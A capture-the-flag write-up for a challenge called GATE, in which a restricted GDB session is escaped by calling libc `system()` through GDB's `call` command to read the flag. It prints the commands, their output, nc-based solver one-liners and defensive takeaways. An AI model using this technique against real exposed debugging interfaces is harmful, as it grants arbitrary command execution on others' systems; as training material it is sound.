---
title: "GATE - CTF Writeup"
date: 2026-02-11
draft: false
description: "Misc challenge writeup"
tags: ["Misc"]
categories: ["Writeups"]
---

**Challenge Name:** GATE  
**Category:** Misc  
**CTF:** MOJO-JOJO  
**Description:** DO U KNOW THAT GDB STANDS FOR GO DOWN BITCH
**Connection:** `nc 4.233.210.175 1339`

---

## TL;DR

The challenge drops us into a **restricted GDB session** with a binary called `target`. By leveraging GDB's **`call` command** to invoke `system()` from the dynamically linked libc, we can execute arbitrary shell commands, read the flag from `flag.txt`, and escape the jail.

## Challenge Artefacts

- Binary: target (provided)
- Connection: `nc 4.233.210.175 1339`
- Environment: GDB jail with breakpoint at `target.c:12`

## Initial Connection

```bash
$ nc 4.233.210.175 1339
Reading symbols from ./target...
The GATE is closed. You are in the jail.
Do you know what gdb stands for?
GO DOWN BITCH!!!!!!
Temporary breakpoint 1 at 0x401170: file target.c, line 12.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, main () at target.c:12
(gdb)
```

**Key observations:**

- We're given a GDB prompt with the binary stopped at a breakpoint
- The binary is dynamically linked with libc
- The challenge message hints at using GDB ("GO DOWN BITCH")

## Understanding the Environment

### Available Functions

Using `info functions` reveals standard libc functions:

- **`system@plt`** - Critical for exploitation
- `puts@plt`, `setvbuf@plt`, `sleep@plt`

Custom functions from target.c:

- `force_link_system` (line 7)
- `main` (line 11)

### File System Structure

We can explore the file system using GDB's `call` command:

```gdb
(gdb) call system("ls -la")
```

Output:

```
total 60
drwxr-x--- 1 root ctf   4096 Feb  7 01:00 .
drwxr-xr-x 1 root root  4096 Feb  7 01:00 ..
-rwxr-x--- 1 root ctf    220 Jan  6  2022 .bash_logout
-rwxr-x--- 1 root ctf   3771 Jan  6  2022 .bashrc
-rwxr-x--- 1 root ctf    807 Jan  6  2022 .profile
-rwxr----- 1 root ctf     57 Feb  7 01:00 flag.txt
-rwxr-x--- 1 root ctf     23 Feb  7 00:09 gdbinit
-rwxr-x--- 1 root ctf   1655 Feb  7 00:09 jail.py
-rwxr-xr-x 1 root root    62 Feb  7 01:00 start.sh
-rwxr-x--- 1 root ctf  18856 Feb  7 00:09 target
$1 = 0
```

The flag is in `flag.txt`!

## Finding the Vulnerability

### GDB's `call` Command

GDB provides a `call` command that **executes functions in the debugged program's context**. Since the target binary is dynamically linked with libc, we have access to powerful functions like `system()`.

**Syntax:**

```gdb
call function_name(arguments)
```

### Why This Works

1. The binary links against libc, which provides `system()`
2. GDB's `call` executes functions in the process's memory space
3. `system()` spawns a shell and runs arbitrary commands
4. No authentication or restrictions prevent this execution

### Exploitation Path

The attack is straightforward:

```
GDB prompt → call system("command") → arbitrary code execution → read flag
```

## Exploitation Steps

1. **Connect to the challenge:**

   ```bash
   nc 4.233.210.175 1339
   ```

2. **Test command execution:**

   ```gdb
   (gdb) call system("ls -la")
   ```

3. **Read the flag:**

   ```gdb
   (gdb) call system("cat flag.txt")
   ```

   Output:

   ```
   [Detaching after vfork from child process 1666]
   MOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng}
   $1 = 0
   ```

## Solver Script

### One-liner

```bash
echo 'call system("cat flag.txt")' | nc 4.233.210.175 1339
```

### Using heredoc

```bash
nc 4.233.210.175 1339 << 'EOF'
call system("cat flag.txt")
EOF
```

Expected output:

```
MOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng}
```

## Final Flag

```
MOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng}
```

## Takeaways

- **Never expose GDB to untrusted users**: The `call` command provides direct function execution, bypassing all security boundaries.
- **Dynamic linking risks**: Linked libc functions (`system`, `exec`) become attack vectors when accessible through debugging interfaces.
- **Jail escapes via debuggers**: GDB's powerful introspection and execution capabilities make it a dangerous tool in the wrong hands.
- **Challenge naming**: "GO DOWN BITCH" cleverly hints at using GDB's **Direct Memory Execution** capabilities (as referenced in the flag).
- **Defense**: Sandbox debugging interfaces, restrict available functions, or avoid exposing debuggers entirely in production/CTF environments.

## Additional Notes

The challenge likely uses a Python script (`jail.py`) to wrap the GDB session and provide the interactive environment. The `gdbinit` file probably sets up the initial breakpoint and restrictions. However, these restrictions don't prevent the use of the `call` command, which is the intended exploitation vector.

